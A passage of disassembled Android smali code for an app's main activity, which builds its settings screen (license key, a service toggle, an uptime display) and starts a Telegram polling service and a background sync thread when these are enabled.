    invoke-direct {v0, v11}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v11

    invoke-virtual {v10, v2, v11, v2, v2}, Landroid/widget/LinearLayout$LayoutParams;->setMargins(IIII)V

    .line 154
    invoke-virtual {v6, v10}, Landroid/widget/Button;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 155
    invoke-virtual {v6, v4}, Landroid/widget/Button;->setAllCaps(Z)V

    .line 156
    invoke-virtual {v1, v6}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 157
    new-instance v10, Lcom/virtus/module/MainActivity$2;

    invoke-direct {v10, v0}, Lcom/virtus/module/MainActivity$2;-><init>(Lcom/virtus/module/MainActivity;)V

    invoke-virtual {v6, v10}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 164
    new-instance v6, Landroid/widget/Switch;

    invoke-direct {v6, v0}, Landroid/widget/Switch;-><init>(Landroid/content/Context;)V

    iput-object v6, v0, Lcom/virtus/module/MainActivity;->toggleSwitch:Landroid/widget/Switch;

    .line 165
    const-string v10, "START SERVICE"

    invoke-virtual {v6, v10}, Landroid/widget/Switch;->setText(Ljava/lang/CharSequence;)V

    .line 166
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->toggleSwitch:Landroid/widget/Switch;

    const-string v10, "#E8EAF6"

    invoke-static {v10}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v10

    invoke-virtual {v6, v10}, Landroid/widget/Switch;->setTextColor(I)V

    .line 167
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->toggleSwitch:Landroid/widget/Switch;

    invoke-virtual {v6, v9}, Landroid/widget/Switch;->setTextSize(F)V

    .line 168
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->toggleSwitch:Landroid/widget/Switch;

    sget-object v9, Landroid/graphics/Typeface;->DEFAULT_BOLD:Landroid/graphics/Typeface;

    invoke-virtual {v6, v9}, Landroid/widget/Switch;->setTypeface(Landroid/graphics/Typeface;)V

    .line 169
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->toggleSwitch:Landroid/widget/Switch;

    const/16 v9, 0xa

    invoke-direct {v0, v9}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v9

    invoke-virtual {v6, v2, v9, v2, v2}, Landroid/widget/Switch;->setPadding(IIII)V

    .line 170
    new-instance v6, Landroid/widget/LinearLayout$LayoutParams;

    const/16 v9, 0x34

    .line 171
    invoke-direct {v0, v9}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v9

    invoke-direct {v6, v7, v9}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 172
    invoke-direct {v0, v13}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v7

    invoke-virtual {v6, v2, v7, v2, v2}, Landroid/widget/LinearLayout$LayoutParams;->setMargins(IIII)V

    .line 173
    iget-object v7, v0, Lcom/virtus/module/MainActivity;->toggleSwitch:Landroid/widget/Switch;

    invoke-virtual {v7, v6}, Landroid/widget/Switch;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 174
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->toggleSwitch:Landroid/widget/Switch;

    invoke-virtual {v1, v6}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 175
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->toggleSwitch:Landroid/widget/Switch;

    iget-object v7, v0, Lcom/virtus/module/MainActivity;->prefs:Landroid/content/SharedPreferences;

    const-string v9, "service_on"

    invoke-interface {v7, v9, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v7

    invoke-virtual {v6, v7}, Landroid/widget/Switch;->setChecked(Z)V

    .line 176
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->toggleSwitch:Landroid/widget/Switch;

    new-instance v7, Lcom/virtus/module/MainActivity$3;

    invoke-direct {v7, v0}, Lcom/virtus/module/MainActivity$3;-><init>(Lcom/virtus/module/MainActivity;)V

    invoke-virtual {v6, v7}, Landroid/widget/Switch;->setOnCheckedChangeListener(Landroid/widget/CompoundButton$OnCheckedChangeListener;)V

    .line 193
    new-instance v6, Landroid/widget/TextView;

    invoke-direct {v6, v0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 194
    const-string v7, "UPTIME"

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const/high16 v7, 0x41200000    # 10.0f

    .line 195
    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setTextSize(F)V

    const v7, 0x3df5c28f    # 0.12f

    .line 196
    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setLetterSpacing(F)V

    .line 197
    invoke-static {v12}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v7

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setTextColor(I)V

    .line 198
    sget-object v7, Landroid/graphics/Typeface;->DEFAULT_BOLD:Landroid/graphics/Typeface;

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V

    const/16 v7, 0x11

    .line 199
    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setGravity(I)V

    const/16 v7, 0xe

    .line 200
    invoke-direct {v0, v7}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v7

    invoke-direct {v0, v13}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v10

    invoke-virtual {v6, v2, v7, v2, v10}, Landroid/widget/TextView;->setPadding(IIII)V

    .line 201
    invoke-virtual {v1, v6}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 203
    new-instance v6, Landroid/widget/TextView;

    invoke-direct {v6, v0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    iput-object v6, v0, Lcom/virtus/module/MainActivity;->uptimeText:Landroid/widget/TextView;

    .line 204
    const-string v7, "\u2014"

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 205
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->uptimeText:Landroid/widget/TextView;

    const/high16 v7, 0x41d00000    # 26.0f

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setTextSize(F)V

    .line 206
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->uptimeText:Landroid/widget/TextView;

    const/16 v7, 0x11

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setGravity(I)V

    .line 207
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->uptimeText:Landroid/widget/TextView;

    const-string v7, "monospace"

    invoke-static {v7, v4}, Landroid/graphics/Typeface;->create(Ljava/lang/String;I)Landroid/graphics/Typeface;

    move-result-object v7

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V

    .line 208
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->uptimeText:Landroid/widget/TextView;

    const-string v7, "#64B5F6"

    invoke-static {v7}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v7

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setTextColor(I)V

    .line 209
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->uptimeText:Landroid/widget/TextView;

    invoke-static {v8}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v7

    const/4 v8, 0x0

    const/high16 v10, 0x41200000    # 10.0f

    invoke-virtual {v6, v10, v8, v8, v7}, Landroid/widget/TextView;->setShadowLayer(FFFI)V

    .line 210
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->uptimeText:Landroid/widget/TextView;

    invoke-virtual {v1, v6}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 213
    new-instance v6, Landroid/widget/TextView;

    invoke-direct {v6, v0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    iput-object v6, v0, Lcom/virtus/module/MainActivity;->statusText:Landroid/widget/TextView;

    .line 214
    const-string v7, "Idle \u2014 enter key & press test"

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 215
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->statusText:Landroid/widget/TextView;

    const/high16 v7, 0x41400000    # 12.0f

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setTextSize(F)V

    .line 216
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->statusText:Landroid/widget/TextView;

    invoke-static {v12}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v7

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setTextColor(I)V

    .line 217
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->statusText:Landroid/widget/TextView;

    const/16 v7, 0x11

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setGravity(I)V

    .line 218
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->statusText:Landroid/widget/TextView;

    invoke-direct {v0, v15}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v7

    invoke-virtual {v6, v2, v7, v2, v2}, Landroid/widget/TextView;->setPadding(IIII)V

    .line 219
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->statusText:Landroid/widget/TextView;

    invoke-virtual {v1, v6}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 221
    invoke-virtual {v3, v5}, Landroid/widget/ScrollView;->addView(Landroid/view/View;)V

    .line 222
    invoke-virtual {v0, v3}, Lcom/virtus/module/MainActivity;->setContentView(Landroid/view/View;)V

    .line 225
    iget-object v1, v0, Lcom/virtus/module/MainActivity;->prefs:Landroid/content/SharedPreferences;

    const-string v3, "license_key"

    const-string v5, ""

    invoke-interface {v1, v3, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 226
    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_0

    .line 227
    iput-boolean v4, v0, Lcom/virtus/module/MainActivity;->isRestoring:Z

    .line 228
    iget-object v3, v0, Lcom/virtus/module/MainActivity;->keyInput:Landroid/widget/EditText;

    invoke-virtual {v3, v1}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    .line 229
    iget-object v3, v0, Lcom/virtus/module/MainActivity;->keyInput:Landroid/widget/EditText;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    invoke-virtual {v3, v1}, Landroid/widget/EditText;->setSelection(I)V

    .line 230
    iput-boolean v2, v0, Lcom/virtus/module/MainActivity;->isRestoring:Z

    iget-object v3, v0, Lcom/virtus/module/MainActivity;->prefs:Landroid/content/SharedPreferences;

    const-string v5, "license_key"

    const-string v6, ""

    invoke-interface {v3, v5, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_0

    new-instance v5, Ljava/lang/Thread;

    new-instance v6, Lcom/virtus/module/MainActivity$BotSync;

    invoke-direct {v6, v0, v3}, Lcom/virtus/module/MainActivity$BotSync;-><init>(Lcom/virtus/module/MainActivity;Ljava/lang/String;)V

    invoke-direct {v5, v6}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v5}, Ljava/lang/Thread;->start()V

    .line 232
    :cond_0
    iget-object v1, v0, Lcom/virtus/module/MainActivity;->prefs:Landroid/content/SharedPreferences;

    invoke-interface {v1, v9, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 233
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/virtus/module/TelegramPollingService;

    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Lcom/virtus/module/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 235
    :cond_1
    iget-object v1, v0, Lcom/virtus/module/MainActivity;->uiHandler:Landroid/os/Handler;

    iget-object v2, v0, Lcom/virtus/module/MainActivity;->uptimeTick:Ljava/lang/Runnable;

    const-wide/16 v3, 0x3e8

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method protected onDestroy()V
    .locals 2

    .line 246
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    .line 247
    iget-object v0, p0, Lcom/virtus/module/MainActivity;->uiHandler:Landroid/os/Handler;

    iget-object v1, p0, Lcom/virtus/module/MainActivity;->uptimeTick:Ljava/lang/Runnable;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    return-void
.end method

.method protected onResume()V
    .locals 0

    .line 240
    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    .line 241
    invoke-direct {p0}, Lcom/virtus/module/MainActivity;->refreshStatus()V

    return-void
.end method
